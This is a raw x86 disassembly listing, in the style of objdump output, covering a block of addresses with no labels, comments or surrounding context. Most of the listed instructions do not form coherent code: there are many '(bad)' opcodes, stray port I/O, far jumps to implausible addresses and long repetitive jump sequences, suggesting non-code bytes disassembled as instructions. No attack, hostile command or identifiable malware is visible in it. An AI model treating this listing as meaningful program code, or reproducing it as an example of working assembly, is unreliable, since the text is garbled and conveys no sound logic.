  44a605:	add    DWORD PTR [edi],esi
  44a607:	lds    esp,FWORD PTR [ecx+0x17]
  44a60a:	pop    ss
  44a60b:	fdiv   DWORD PTR [edi+esi*8]
  44a60e:	jmp    esi
  44a610:	xor    eax,0x6e03f626
  44a615:	mov    dl,0x20
  44a617:	mov    ch,0x50
  44a619:	mul    edi
  44a61b:	out    0x2d,al
  44a61d:	es add eax,0x151733e7
  44a623:	fsub   DWORD PTR [edi+0x4f03cd9d]
  44a629:	add    DWORD PTR [edi-0x24d8d23a],esi
  44a62f:	shr    esp,1
  44a631:	es leave 
  44a633:	lock add DWORD PTR [edx],ecx
  44a636:	mov    bl,0xd9
  44a638:	fmul   QWORD PTR [edx+ebp*4]
  44a63b:	aam    0x77
  44a63d:	popf   
  44a63e:	lds    eax,FWORD PTR [ebx]
  44a640:	fild   WORD PTR [ecx]
  44a642:	mov    bh,0xc2
  44a644:	retf   
  44a645:	push   ss
  44a646:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a647:	out    0xe2,al
  44a649:	and    DWORD PTR [edx-0x7bd93d10],ebp
  44a64f:	jmp    0xb28a:0x3a915b5
  44a656:	mov    al,ds:0x80ebd0b4
  44a65b:	in     al,0x0
  44a65d:	add    BYTE PTR [eax],al
  44a65f:	add    BYTE PTR [eax],al
  44a661:	stos   DWORD PTR es:[edi],eax
  44a662:	push   cs
  44a663:	test   BYTE PTR [ebx],0x87
  44a666:	mov    dl,0xe
  44a668:	sahf   
  44a669:	fdivr  st(1),st
  44a66b:	dec    ebx
  44a66c:	jge    0x44a68e
  44a66e:	and    BYTE PTR [edx+0x2c],dh
  44a671:	cmp    bh,dh
  44a673:	js     0x44a6ca
  44a675:	xchg   esp,eax
  44a676:	in     eax,dx
  44a677:	cmp    ebx,DWORD PTR [ebx]
  44a679:	rcr    edi,1
  44a67b:	sbb    al,0xff
  44a67d:	not    DWORD PTR [eax]
  44a67f:	jnp    0x44a66a
  44a681:	xchg   ebx,eax
  44a682:	ror    BYTE PTR ds:0x5604da19,cl
  44a688:	inc    esp
  44a689:	mov    esp,0xd5355d13
  44a68e:	std    
  44a68f:	pop    esp
  44a690:	sbb    eax,0x1b78091d
  44a695:	mov    bh,0x9c
  44a697:	call   0x72363a64
  44a69c:	sbb    ebx,eax
  44a69e:	fdiv   DWORD PTR [ecx+0x15]
  44a6a1:	scas   eax,DWORD PTR es:[edi]
  44a6a2:	or     BYTE PTR [edx+0x2a],dh
  44a6a5:	mov    bh,0x22
  44a6a7:	arpl   WORD PTR [eax],ax
  44a6a9:	mov    edx,0xb8086c09
  44a6ae:	std    
  44a6af:	push   eax
  44a6b0:	(bad)  [eax-0x7f2ac3eb]
  44a6b6:	and    dh,BYTE PTR [edx-0x17]
  44a6b9:	xchg   ebx,eax
  44a6ba:	clc    
  44a6bb:	push   cs
  44a6bc:	stos   BYTE PTR es:[edi],al
  44a6bd:	jbe    0x44a6e1
  44a6bf:	arpl   WORD PTR [esi-0x6587009d],si
  44a6c5:	add    BYTE PTR [eax],al
  44a6c7:	add    BYTE PTR [eax],al
  44a6c9:	add    BYTE PTR [edx+0x21],cl
  44a6cc:	arpl   sp,cx
  44a6ce:	jbe    0x44a6d1
  44a6d0:	arpl   WORD PTR [esi-0x16c000bb],di
  44a6d6:	xchg   ebx,eax
  44a6d7:	ror    BYTE PTR [esi],0xaa
  44a6da:	and    ah,BYTE PTR ss:[ebx-0x56]
  44a6de:	aaa    
  44a6df:	adc    eax,0x804845c
  44a6e4:	js     0x44a6e6
  44a6e6:	mov    ebx,0x5dffe894
  44a6eb:	mov    al,0x4b
  44a6ed:	gs stos DWORD PTR es:[edi],eax
  44a6ef:	sub    DWORD PTR [ebx],0x6e
  44a6f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a6f3:	mov    WORD PTR [ebp+0x65],cs
  44a6f6:	mov    ebx,0x6066777a
  44a6fb:	(bad)  
  44a6fc:	outs   dx,DWORD PTR ds:[esi]
  44a6fd:	je     0x44a753
  44a6ff:	jg     0x44a758
  44a701:	outs   dx,BYTE PTR ds:[esi]
  44a702:	mov    edx,0x4472717a
  44a707:	mov    dh,0x9
  44a709:	add    BYTE PTR [edx-0x4a8ba177],bh
  44a70f:	jns    0x44a789
  44a711:	ins    BYTE PTR es:[edi],dx
  44a712:	push   eax
  44a713:	(bad)  
  44a714:	outs   dx,DWORD PTR ds:[esi]
  44a715:	je     0x44a69b
  44a717:	outs   dx,DWORD PTR ds:[esi]
  44a718:	dec    ebx
  44a719:	jb     0x44a6c0
  44a71b:	lea    ecx,[edx+0x69]
  44a71e:	call   0x728b:0x6a657495
  44a725:	je     0x44a6ab
  44a727:	jle    0x44a79d
  44a729:	add    dh,cl
  44a72b:	mov    dh,0x3e
  44a72d:	inc    esi
  44a72e:	add    BYTE PTR [eax],al
  44a730:	add    BYTE PTR [eax],al
  44a732:	add    BYTE PTR [ecx-0x618f9f97],al
  44a738:	xor    DWORD PTR [ebx+eax*2-0x3c],0x65537481
  44a740:	mov    WORD PTR [esi+0x65],ds
  44a743:	xor    al,0x77
  44a745:	call   0x4bfb7d49
  44a74a:	jb     0x44a79c
  44a74c:	jg     0x44a7c2
  44a74e:	push   ebp
  44a74f:	pop    edi
  44a750:	jg     0x44a7b0
  44a752:	outs   dx,DWORD PTR ds:[esi]
  44a753:	and    eax,0x35746d8a
  44a758:	xchg   esi,eax
  44a759:	je     0x44a7bc
  44a75b:	imul   ebp,DWORD PTR [edi+0x5f50524b],0x77903354
  44a765:	cmp    bl,BYTE PTR [esp+ebp*4+0x1d]
  44a769:	or     al,0x8f
  44a76b:	nop
  44a76c:	(bad)  
  44a76d:	cli    
  44a76e:	imul   esi,DWORD PTR [ebp-0x63a305e9],0x48
  44a775:	mov    esi,0xa730b360
  44a77a:	jno    0x44a720
  44a77c:	retf   0x6f12
  44a77f:	nop
  44a780:	loope  0x44a748
  44a782:	imul   eax,DWORD PTR [eax-0x7da33a26],0x2
  44a789:	fisub  DWORD PTR [ebp+0x6e]
  44a78c:	add    al,0xd2
  44a78e:	(bad)  
  44a78f:	out    dx,eax
  44a790:	add    eax,0xdd76490c
  44a795:	cmc    
  44a796:	jno    0x44a798
  44a798:	add    BYTE PTR [eax],al
  44a79a:	add    BYTE PTR [eax],al
  44a79c:	outs   dx,BYTE PTR ds:[esi]
  44a79d:	test   dh,0x42
  44a7a0:	addr16 ret 
  44a7a2:	clc    
  44a7a3:	pop    esp
  44a7a4:	xor    eax,ebp
  44a7a6:	sar    edi,1
  44a7a8:	(bad)  
  44a7a9:	dec    ebp
  44a7aa:	or     al,0x49
  44a7ac:	(bad)
  44a7b0:	es scas al,BYTE PTR es:[edi]
  44a7b2:	(bad)  
  44a7b3:	push   ecx
  44a7b4:	xor    eax,0x393df6aa
  44a7b9:	mov    ch,0xf5
  44a7bb:	call   FWORD PTR [edi+0x26490c36]
  44a7c1:	jge    0x44a7ba
  44a7c3:	jno    0x44a7c3
  44a7c5:	outs   dx,BYTE PTR ds:[esi]
  44a7c6:	rcl    BYTE PTR [edx-0x13],0x77
  44a7ca:	fldcw  WORD PTR [edi+0x4]
  44a7cd:	jae    0x44a7c8
  44a7cf:	ror    DWORD PTR gs:[ebx+0x6390720c],1
  44a7d6:	shr    BYTE PTR [ebx-0x20],0x50
  44a7da:	mov    esp,0xf73dee5c
  44a7df:	jo     0x44a7be
  44a7e1:	mov    dl,0x9a
  44a7e3:	sar    BYTE PTR [ebx-0x45fc0a0d],cl
  44a7e9:	mov    dl,0xad
  44a7eb:	xlat   BYTE PTR ds:[ebx]
  44a7ec:	stos   DWORD PTR es:[edi],eax
  44a7ed:	and    dh,BYTE PTR [edi-0x64fb2419]
  44a7f3:	aam    0xbc
  44a7f5:	pcmpgtw mm2,mm7
  44a7f8:	iret   
  44a7f9:	seta   bh
  44a7fc:	mov    esp,0xc46524
  44a801:	add    BYTE PTR [eax],al
  44a803:	add    BYTE PTR [eax],al
  44a805:	pop    ss
  44a806:	call   0xd442:0x1e58046f
  44a80d:	bound  ecx,QWORD PTR [edi]
  44a80f:	push   eax
  44a810:	call   0xd78bb776
  44a815:	push   esp
  44a816:	and    eax,0x99efc32a
  44a81b:	imul   eax,DWORD PTR [ecx+ebx*2],0x8
  44a81f:	sub    ah,bh
  44a821:	popa   
  44a822:	or     BYTE PTR [ebx-0x28],dl
  44a825:	dec    esi
  44a826:	and    bl,BYTE PTR [ebx]
  44a828:	out    dx,al
  44a829:	push   eax
  44a82a:	mov    dl,0x78
  44a82c:	add    al,0x59
  44a82e:	or     BYTE PTR [edx],cl
  44a830:	out    0x41,eax
  44a832:	or     BYTE PTR [ebx],dl
  44a834:	fcom   DWORD PTR [edx+0x6]
  44a837:	add    ecx,edx
  44a839:	dec    esp
  44a83a:	jmp    0x41b:0x64bee16
  44a841:	shl    DWORD PTR [edx+0xf2bee2e],cl
  44a847:	(bad)  
  44a848:	in     eax,dx
  44a849:	in     al,dx
  44a84a:	push   ds
  44a84b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a84c:	(bad)  
  44a84d:	in     al,0x24
  44a84f:	mov    edi,0xcf1eefcc
  44a854:	in     al,dx
  44a855:	in     eax,dx
  44a856:	repz cmc 
  44a858:	add    ebx,edi
  44a85a:	jmp    0x44a813
  44a85c:	retf   0xefcd
  44a85f:	push   cs
  44a860:	popf   
  44a861:	lods   eax,DWORD PTR ds:[esi]
  44a862:	idiv   BYTE PTR [edx-0x43]
  44a865:	xchg   ebx,eax
  44a866:	icebp  
  44a867:	pop    edx
  44a868:	lods   al,BYTE PTR ds:[esi]
  44a869:	add    BYTE PTR [eax],al
  44a86b:	add    BYTE PTR [eax],al
  44a86d:	add    BYTE PTR [edx-0x1a],dl
  44a870:	inc    edx
  44a871:	fisub  DWORD PTR [ecx+0x2f8572d0]
  44a877:	cdq    
  44a878:	call   0x72353491
  44a87d:	jge    0x44a865
  44a87f:	and    esi,DWORD PTR [edx+0x7b]
  44a882:	dec    esp
  44a883:	mul    BYTE PTR [edx-0x60]
  44a886:	sub    eax,0x93e977f7
  44a88b:	sti    
  44a88c:	push   cs
  44a88d:	aaa    
  44a88e:	test   DWORD PTR [esi+ecx*2],0x61f2fb59
  44a895:	dec    edi
  44a896:	div    ch
  44a898:	pop    esp
  44a899:	daa    
  44a89a:	loop   0x44a891
  44a89c:	jno    0x44a887
  44a89e:	xchg   ebx,eax
  44a89f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a8a0:	comiss xmm5,xmm7
  44a8a3:	or     al,0x42
  44a8a5:	cmp    dh,bh
  44a8a7:	and    dl,BYTE PTR [edx+0x3f]
  44a8aa:	mov    edi,0xd7370f0d
  44a8af:	in     al,dx
  44a8b0:	dec    ebp
  44a8b1:	cmp    ebx,ebx
  44a8b3:	jecxz  0x44a8d1
  44a8b5:	(bad)  
  44a8b6:	mov    bh,0x14
  44a8b8:	jnp    0x44a8a3
  44a8ba:	xchg   ebx,eax
  44a8bb:	fmul   QWORD PTR [esi]
  44a8bd:	cs mov bh,0xc
  44a8c0:	dec    esi
  44a8c1:	add    eax,0xc6308b3
  44a8c6:	ret    0x4e23
  44a8c9:	add    eax,0xda7222a8
  44a8ce:	pusha  
  44a8cf:	neg    DWORD PTR [ebx-0x17]
  44a8d2:	add    BYTE PTR [eax],al
  44a8d4:	add    BYTE PTR [eax],al
  44a8d6:	add    BYTE PTR [ebx+0x4fa13ee9],dl
  44a8dc:	call   0xce8f622e
  44a8e1:	push   edx
  44a8e2:	add    BYTE PTR ds:0xffffe868,ah
  44a8e8:	mov    ah,0x3f
  44a8ea:	sbb    eax,DWORD PTR gs:[edx-0x4b96908e]
  44a8f1:	hlt    
  44a8f2:	add    al,0x24
  44a8f4:	xchg   ecx,eax
  44a8f5:	jae    0x44a95a
  44a8f7:	sub    DWORD PTR [ebp-0x18],edi
  44a8fa:	call   DWORD PTR [edi-0x4b9a8e51]
  44a900:	or     BYTE PTR [ebx+0x74],0x39
  44a904:	mov    ah,0xf5
  44a906:	add    al,0x14
  44a908:	xchg   ecx,eax
  44a909:	jae    0x44a96e
  44a90b:	adc    al,0x84
  44a90d:	call   0x3ff7cf11
  44a912:	jo     0x44a980
  44a914:	or     BYTE PTR [ebx+0x63],0x58
  44a918:	mov    ch,BYTE PTR [eax+eax*1-0x2b]
  44a91c:	mov    dl,0x71
  44a91e:	gs mov ah,0x89
  44a921:	jno    0x44a999
  44a923:	pop    esp
  44a924:	scas   al,BYTE PTR es:[edi]
  44a925:	sbb    al,BYTE PTR ds:0x635e82aa
  44a92b:	push   esp
  44a92c:	jle    0x44a916
  44a92e:	call   DWORD PTR [edx-0x548ba44f]
  44a934:	xor    BYTE PTR [ecx+0x75],0x95
  44a938:	scas   al,BYTE PTR es:[edi]
  44a939:	add    BYTE PTR [ebx],0x0
  44a93c:	add    BYTE PTR [eax],al
  44a93e:	add    BYTE PTR [eax],al
  44a940:	xchg   BYTE PTR [ecx-0x7b498b94],al
  44a946:	call   0x71f7ab4a
  44a94b:	gs xchg esp,eax
  44a94d:	(bad)  
  44a94e:	jo     0x44a9c2
  44a950:	test   eax,0x8603d0b3
  44a955:	test   BYTE PTR [ebp+0x6e],bl
  44a958:	outs   dx,BYTE PTR ds:[esi]
  44a959:	sbb    DWORD PTR [esi+0x69],0x57
  44a95d:	addr16 dec edx
  44a95f:	add    BYTE PTR [eax-0x1a8f02f],dl
  44a965:	jl     0x44a95d
  44a967:	outs   dx,DWORD PTR ds:[esi]
  44a968:	loop   0x44a8ec
  44a96a:	imul   BYTE PTR [ebx-0x12]
  44a96d:	mov    DWORD PTR [edi+ebp*2],ecx
  44a970:	xchg   esp,eax
  44a971:	push   0xfffffff2
  44a973:	jb     0x44a905
  44a975:	push   esi
  44a976:	shr    DWORD PTR [ebp-0x4d],0x3b
  44a97a:	fsub   DWORD PTR ds:0xfff025ac
  44a980:	aas    
  44a981:	xchg   ecx,eax
  44a982:	or     al,0x3f
  44a984:	lods   eax,DWORD PTR ds:[esi]
  44a985:	cmp    eax,0x26bc68ce
  44a98a:	sahf   
  44a98b:	pop    esp
  44a98c:	mov    ds:0xae66fb1c,al
  44a991:	push   edx
  44a992:	neg    BYTE PTR [ebp-0x59]
  44a995:	inc    eax
  44a996:	or     al,0x10
  44a998:	nop
  44a999:	xlat   BYTE PTR ds:[ebx]
  44a99a:	in     eax,dx
  44a99b:	jno    0x44a9fe
  44a99d:	(bad)  
  44a99e:	in     eax,dx
  44a99f:	jno    0x44aa1a
  44a9a1:	xlat   BYTE PTR ds:[ebx]
  44a9a2:	icebp  
  44a9a3:	arpl   WORD PTR [eax],ax
  44a9a5:	add    BYTE PTR [eax],al
  44a9a7:	add    BYTE PTR [eax],al
  44a9a9:	jge    0x44a999
  44a9ab:	fwait
  44a9ac:	(bad)  
  44a9ad:	out    dx,eax
  44a9ae:	xchg   DWORD PTR [edi+edi*1],ecx
  44a9b1:	ins    DWORD PTR es:[edi],dx
  44a9b2:	(bad)  
  44a9b4:	push   0x5c9ce66c
  44a9b9:	(bad)  
  44a9ba:	fdiv   st(1),st
  44a9bc:	data16 ds loop 0x44a9b4
  44a9c0:	pop    ebp
  44a9c1:	aaa    
  44a9c2:	fdiv   st(1),st
  44a9c4:	jns    0x44a9fb
  44a9c6:	fcom   DWORD PTR [edx]
  44a9c8:	dec    esi
  44a9c9:	dec    ebp
  44a9ca:	fistp  DWORD PTR [edi+0x34df5f48]
  44a9d0:	pop    esp
  44a9d1:	xor    al,0xa5
  44a9d3:	adc    al,dh
  44a9d5:	xchg   esp,eax
  44a9d6:	mov    ebx,0x973d63be
  44a9db:	mov    ebp,0xd9b2fe68
  44a9e0:	add    ebx,DWORD PTR [eax-0x141f5b51]
  44a9e6:	in     al,dx
  44a9e7:	into   
  44a9e8:	out    0xd4,eax
  44a9ea:	add    ch,BYTE PTR [ecx-0x24e10a14]
  44a9f0:	aad    0x67
  44a9f2:	xchg   esi,eax
  44a9f3:	ret    0xd6ff
  44a9f6:	pop    ds
  44a9f7:	stos   BYTE PTR es:[edi],al
  44a9f8:	shl    esp,cl
  44a9fa:	push   ds
  44a9fb:	mov    dl,0xe0
  44a9fd:	mov    cl,0x1f
  44a9ff:	cdq    
  44aa00:	mov    dh,0xbb
  44aa02:	and    BYTE PTR [edi-0x17],bh
  44aa05:	fdivrp st(3),st
  44aa07:	cmc    
  44aa08:	add    esp,DWORD PTR [eax]
  44aa0a:	mov    al,0xa2
  44aa0c:	jmp    0x44aa11
  44aa11:	add    BYTE PTR [edi-0x4c207fed],dh
  44aa17:	setb   al
  44aa1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44aa1b:	adc    DWORD PTR [ebx+0x690babd3],ebx
  44aa21:	jmp    0xd086b5f3
  44aa26:	fs and dh,dh
  44aa29:	add    esp,DWORD PTR [eax-0x51]
  44aa2c:	and    al,0xdf
  44aa2e:	imul   edi,edi,0x27
  44aa31:	in     al,dx
  44aa32:	jo     0x44aa38
  44aa34:	pop    edx
  44aa35:	call   0xdc77b87e
  44aa3a:	jb     0x44aa4b
  44aa3c:	shr    BYTE PTR es:[eax+0x5],1
  44aa40:	sub    dl,al
  44aa42:	cmp    BYTE PTR [esi],al
  44aa44:	or     bl,bh
  44aa46:	inc    ecx
  44aa47:	mov    dl,0x4d
  44aa49:	add    esp,DWORD PTR [edi+0xf]
  44aa4c:	(bad)  
  44aa4d:	in     al,0x54
  44aa4f:	and    al,BYTE PTR [edx]
  44aa51:	mov    ecx,0xe0001337
  44aa56:	xor    ecx,DWORD PTR [edi]
  44aa58:	in     al,0x14
  44aa5a:	nop
  44aa5b:	mov    dl,0xe
  44aa5d:	jmp    0xe9535cf5
  44aa62:	xchg   ebx,eax
  44aa63:	mov    dl,0xe
  44aa65:	jmp    0xe9535cfd
  44aa6a:	xchg   ebx,eax
  44aa6b:	mov    dl,0xe
  44aa6d:	jmp    0xe9535d05
  44aa72:	xchg   ebx,eax
  44aa73:	mov    dl,0xe
  44aa75:	jmp    0x44aa7a
  44aa7a:	add    BYTE PTR [ebx-0x6c16f14e],dl
  44aa80:	mov    dl,0xe
  44aa82:	jmp    0xe9535d1a
  44aa87:	xchg   ebx,eax
  44aa88:	mov    dl,0xe
  44aa8a:	jmp    0xe9535d22
  44aa8f:	xchg   ebx,eax
  44aa90:	mov    dl,0xe
  44aa92:	jmp    0xe9535d2a
  44aa97:	xchg   ebx,eax
  44aa98:	mov    dl,0xe
  44aa9a:	jmp    0xe9535d32
  44aa9f:	xchg   ebx,eax
  44aaa0:	mov    dl,0xe
  44aaa2:	jmp    0xe9535d3a
  44aaa7:	xchg   ebx,eax
  44aaa8:	mov    dl,0xe
  44aaaa:	jmp    0xe9535d42
  44aaaf:	xchg   ebx,eax
  44aab0:	mov    dl,0xe
  44aab2:	jmp    0xe9535d4a
  44aab7:	xchg   ebx,eax
  44aab8:	mov    dl,0xe
  44aaba:	jmp    0xe9535d52
  44aabf:	xchg   ebx,eax
  44aac0:	mov    dl,0xe
  44aac2:	jmp    0xe9535d5a
  44aac7:	xchg   ebx,eax
  44aac8:	mov    dl,0xe
  44aaca:	jmp    0xe9535d62
  44aacf:	xchg   ebx,eax
  44aad0:	mov    dl,0xe
  44aad2:	jmp    0xe9535d6a
  44aad7:	xchg   ebx,eax
  44aad8:	mov    dl,0xe
  44aada:	add    BYTE PTR [ecx+0xeb0],bh
  44aae0:	add    BYTE PTR [eax],al
  44aae2:	add    BYTE PTR [eax],al
  44aae4:	test   eax,0xa9000eb0
  44aae9:	mov    al,0xe
  44aaeb:	add    BYTE PTR [ecx-0x50],bh
  44aaee:	push   cs
  44aaef:	add    BYTE PTR [ecx-0x50],bh
  44aaf2:	push   cs
  44aaf3:	add    BYTE PTR [ecx-0x50],ch
  44aaf6:	push   cs
  44aaf7:	add    BYTE PTR [ecx-0x50],ch
  44aafa:	push   cs
  44aafb:	add    BYTE PTR [ecx-0x50],bh
  44aafe:	push   cs
  44aaff:	add    BYTE PTR [ecx-0x50],bh
  44ab02:	push   cs
  44ab03:	add    BYTE PTR [ecx-0x50],ch
  44ab06:	push   cs
  44ab07:	add    BYTE PTR [ecx-0x50],ch
  44ab0a:	push   cs
  44ab0b:	add    BYTE PTR [ecx],bh
  44ab0d:	mov    al,0xe
  44ab0f:	add    BYTE PTR [ecx],bh
  44ab11:	mov    al,0xe
  44ab13:	add    BYTE PTR [ecx],ch
  44ab15:	mov    al,0xe
  44ab17:	add    BYTE PTR [ecx-0x4c],dl
  44ab1a:	dec    esi
  44ab1b:	add    BYTE PTR [ecx-0x33],ah
  44ab1e:	dec    esi
  44ab1f:	add    BYTE PTR [eax],bh
  44ab21:	mov    cl,0xe
  44ab23:	add    BYTE PTR [edi],bh
  44ab25:	mov    cl,0xe
  44ab27:	add    BYTE PTR [esi],ch
  44ab29:	mov    al,0xe
  44ab2b:	add    BYTE PTR [ecx-0x39],dl
  44ab2e:	dec    esi
  44ab2f:	add    BYTE PTR [ecx-0x31],bl
  44ab32:	dec    esi
  44ab33:	add    cl,ch
  44ab35:	scas   eax,DWORD PTR es:[edi]
  44ab36:	push   cs
  44ab37:	add    bh,bh
  44ab39:	scas   eax,DWORD PTR es:[edi]
  44ab3a:	push   cs
  44ab3b:	add    dh,cl
  44ab3d:	scas   eax,DWORD PTR es:[edi]
  44ab3e:	push   cs
  44ab3f:	add    cl,bh
  44ab41:	scas   eax,DWORD PTR es:[edi]
  44ab42:	push   cs
  44ab43:	add    BYTE PTR [ecx],dh
  44ab45:	ror    BYTE PTR [esi+0x0],1
  44ab48:	add    BYTE PTR [eax],al
  44ab4a:	add    BYTE PTR [eax],al
  44ab4c:	add    cl,ch
  44ab4e:	scas   eax,DWORD PTR es:[edi]
  44ab4f:	push   cs
  44ab50:	add    dl,ch
  44ab52:	scas   eax,DWORD PTR es:[edi]
  44ab53:	push   cs
  44ab54:	add    BYTE PTR [esi-0x56fff151],dh
  44ab5a:	scas   eax,DWORD PTR es:[edi]
  44ab5b:	push   cs
  44ab5c:	add    BYTE PTR [eax-0x6ffff376],dl
  44ab62:	mov    bl,0x48
  44ab64:	inc    eax
  44ab65:	jmp    0x44ab41
  44ab67:	jmp    0xcce0022
  44ab6c:	add    BYTE PTR [eax-0x566cf097],dl
  44ab72:	mov    DWORD PTR [eax+eax*1],ecx
  44ab75:	nop
  44ab76:	mov    DWORD PTR [eax+eax*1],ecx
  44ab79:	nop
  44ab7a:	mov    DWORD PTR [eax+eax*1],ecx
  44ab7d:	nop
  44ab7e:	mov    eax,ebp
  44ab80:	jmp    FWORD PTR [edi-0x76]
  44ab83:	inc    eax
  44ab84:	mul    DWORD PTR [edi-0x6a]
  44ab87:	or     al,0x0
  44ab89:	nop
  44ab8a:	mov    al,ds:0x4990000c
  44ab8f:	or     al,0x0
  44ab91:	nop
  44ab92:	les    ecx,FWORD PTR [ebx]
  44ab94:	add    BYTE PTR [eax-0x6fffecf7],dl
  44ab9a:	or     al,BYTE PTR [eax-0x9]
  44ab9d:	aaa    
  44ab9e:	mov    eax,ds:0x9190000c
  44aba3:	or     al,0x0
  44aba5:	nop
  44aba6:	imul   ecx,DWORD PTR [eax+eax*1],0xc1490
  44abad:	nop
  44abae:	mov    DWORD PTR [eax+eax*1],ecx
  44abb1:	add    BYTE PTR [eax],al
  44abb3:	add    BYTE PTR [eax],al
  44abb5:	add    BYTE PTR [eax-0x6ffff377],dl
  44abbb:	mov    DWORD PTR [edx+eax*1+0xc8950],ebp
  44abc2:	nop
  44abc3:	mov    DWORD PTR [eax+eax*1],ecx
  44abc6:	nop
  44abc7:	mov    DWORD PTR [ebp+edi*8-0x59],edx
  44abcb:	mov    DWORD PTR [eax+eax*1],ecx
  44abce:	nop
  44abcf:	mov    DWORD PTR [eax+eax*1],ecx
  44abd2:	nop
  44abd3:	mov    DWORD PTR [esi+0x8],eax
  44abd6:	push   eax
  44abd7:	mov    DWORD PTR [eax+eax*1],ecx
  44abda:	nop
  44abdb:	mov    dl,0xf5
  44abdd:	add    edx,DWORD PTR [eax-0x7387ca4e]
  44abe3:	repnz cmc 
  44abe5:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44abeb:	mov    dl,0x5
  44abed:	inc    ebx
  44abee:	xchg   edi,eax
  44abef:	repnz cmc 
  44abf1:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44abf7:	mov    dl,0xd1
  44abf9:	dec    edi
  44abfa:	mov    ds:0x9003f5f2,al
  44abff:	mov    dl,0xf5
  44ac01:	add    edx,DWORD PTR [eax-0x618497ce]
  44ac07:	repnz cmc 
  44ac09:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ac0f:	shr    BYTE PTR [ecx-0x6b],cl
  44ac12:	jns    0x44ac06
  44ac14:	cmc    
  44ac15:	add    edx,DWORD PTR [eax+0xfff5b2]
  44ac1b:	add    BYTE PTR [eax],al
  44ac1d:	add    BYTE PTR [eax],al
  44ac1f:	(bad)  
  44ac20:	jnp    0x44ac2f
  44ac22:	xchg   BYTE PTR [edx+esi*8-0xb],ch
  44ac26:	add    edx,DWORD PTR [eax+0x56471353]
  44ac2c:	scas   al,BYTE PTR es:[edi]
  44ac2d:	xor    esi,DWORD PTR [edx]
  44ac2f:	into   
  44ac30:	repnz aad 0x53
  44ac33:	push   es
  44ac34:	dec    eax
  44ac35:	data16 sub ch,al
  44ac38:	pop    edi
  44ac39:	cmp    edi,DWORD PTR [eax+0x79]
  44ac3c:	repnz add eax,0xdad7fcb8
  44ac42:	cli    
  44ac43:	adc    eax,0x13690f02
  44ac48:	repz inc esi
  44ac4a:	outs   dx,BYTE PTR ds:[esi]
  44ac4b:	fbld   TBYTE PTR [edi]
  44ac4d:	xor    eax,0xff3ee506
  44ac52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ac53:	push   es
  44ac54:	repz into 
  44ac56:	xchg   ebp,eax
  44ac57:	xor    bh,dh
  44ac59:	push   cs
  44ac5a:	les    edx,FWORD PTR [ebx]
  44ac5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ac5d:	xchg   edi,eax
  44ac5e:	push   0x664f4c12
  44ac63:	cwde   
  44ac64:	jg     0x44ac17
  44ac66:	scas   al,BYTE PTR es:[edi]
  44ac67:	pop    ebp
  44ac68:	sti    
  44ac69:	pop    es
  44ac6a:	adc    DWORD PTR [edx+0x65],edx
  44ac6d:	dec    edi
  44ac6e:	(bad)  
  44ac6f:	gs xchg edx,eax
  44ac71:	fwait
  44ac72:	nop
  44ac73:	adc    al,0x7c
  44ac75:	push   eax
  44ac76:	inc    ebx
  44ac77:	and    DWORD PTR [edx+0x4e],ebx
  44ac7a:	xor    eax,0xc6421e0f
  44ac7f:	stos   BYTE PTR es:[edi],al
  44ac80:	aaa    
  44ac81:	loopne 0x44ac5c
  44ac83:	add    BYTE PTR [eax],al
  44ac85:	add    BYTE PTR [eax],al
  44ac87:	add    bl,dh
  44ac89:	push   es
  44ac8a:	dec    ebp
  44ac8b:	popf   
  44ac8c:	mov    edi,0xe750c938
  44ac91:	(bad)  
  44ac92:	hlt    
  44ac93:	iret   
  44ac94:	cmp    ebx,esp
  44ac96:	dec    ebx
  44ac97:	mov    BYTE PTR [esi-0x3dd213e0],bh
  44ac9d:	(bad)  [edi]
  44ac9f:	ins    DWORD PTR es:[edi],dx
  44aca0:	adc    esi,DWORD PTR [eax-0x3fc3feae]
  44aca6:	mov    ah,0x21
  44aca8:	mul    BYTE PTR [ecx-0x732fdb15]
  44acae:	push   ebx
  44acaf:	add    cl,BYTE PTR ds:0xb916dc7e
  44acb5:	xchg   ebx,eax
  44acb6:	push   ebp
  44acb7:	sub    DWORD PTR [esi-0x307bad87],0x51
  44acbe:	jle    0x44aca7
  44acc0:	sub    eax,0x70d0af58
  44acc5:	push   ebp
  44acc6:	push   ecx
  44acc7:	hlt    
  44acc8:	fidivr WORD PTR [edi+0x1013541a]
  44acce:	bound  ebx,QWORD PTR [edi+0x5b]
  44acd1:	cli    
  44acd2:	pop    ecx
  44acd3:	xor    edx,edx
  44acd5:	ins    BYTE PTR es:[edi],dx
  44acd6:	mov    al,0x0
  44acd8:	cmp    ch,BYTE PTR [ebx+eiz*1-0xddceecb]
  44acdf:	push   ebx
  44ace0:	je     0x44ad11
  44ace2:	retf   0xb45d
  44ace5:	iret   
  44ace6:	inc    ecx
  44ace7:	cmp    eax,DWORD PTR [edx+0x7]
  44acea:	jge    0x44ad46
  44acec:	add    BYTE PTR [eax],al
  44acee:	add    BYTE PTR [eax],al
  44acf0:	add    BYTE PTR [esi],dl
  44acf2:	dec    eax
  44acf3:	mov    dh,al
  44acf5:	pop    eax
  44acf6:	aad    0xce
  44acf8:	push   esp
  44acf9:	dec    esp
  44acfa:	cmp    DWORD PTR [eax],edi
  44acfc:	popa   
  44acfd:	clc    
  44acfe:	out    0x93,eax
  44ad00:	pop    edx
  44ad01:	and    cl,ch
  44ad03:	or     DWORD PTR [ebp-0x10],ebx
  44ad06:	in     al,dx
  44ad07:	ret    
  44ad08:	shl    DWORD PTR [bx+si],cl
  44ad0b:	out    0xf3,eax
  44ad0d:	mov    fs,WORD PTR ds:0xc934c8ad
  44ad13:	mov    gs,WORD PTR [esi+0x35]
  44ad16:	std    
  44ad17:	adc    DWORD PTR [edi+0x520d3c99],0x49
  44ad1e:	ror    BYTE PTR [ecx],1
  44ad20:	jne    0x44ad8b
  44ad22:	mov    ah,0xe
  44ad24:	add    BYTE PTR [edi+esi*8-0x2f],dh
  44ad28:	int3   
  44ad29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ad2a:	not    edx
  44ad2c:	int3   
